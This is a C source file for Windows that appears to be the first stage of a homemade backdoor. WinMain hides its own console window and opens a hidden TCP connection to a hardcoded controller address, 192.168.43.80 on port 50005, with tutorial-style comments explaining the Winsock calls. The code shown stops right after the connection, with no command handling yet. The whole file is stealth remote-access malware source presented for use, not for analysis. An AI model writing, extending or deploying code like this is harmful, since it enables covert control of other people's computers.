#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <windows.h>
#include <winsock2.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>

/**
 * hInstance: HInstance is a handle needed by window creation, menus, and a whole host of 
 * other functions to identify the correct program and instance when passing
 * commands or requesting data.
 * 
 * hPrev: used in 16bit windows, now 0
 * lpCmdLine: contains command line arguments
 * nCmdShow: flag for main application window state (minimized, maximized or normal)
***/

// global vars
int sock;


// Main function
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    // hide the window
    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    
    // setup socket for connection
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.43.80";
    ServPort = 50005;

    /**
     * The WSAStartup function must be the first Windows Sockets function called by an application or DLL.
     * It allows an application or DLL to specify the version of Windows Sockets required and
     * retrieve details of the specific Windows Sockets implementation.
     * 
     * WSAStartup function initiates use of Winsock DLL bya process.
     **/
    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

    // AF_INET represents connection over IPv4 
    // SOCK_STREAM defines TCP connection
    // definition: WINSOCK_API_LINKAGE SOCKET WSAAPI socket(int af, int type, int protocol);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    // define params for ServAddr variable
    ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);
    
    // connect to server
    connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr));
}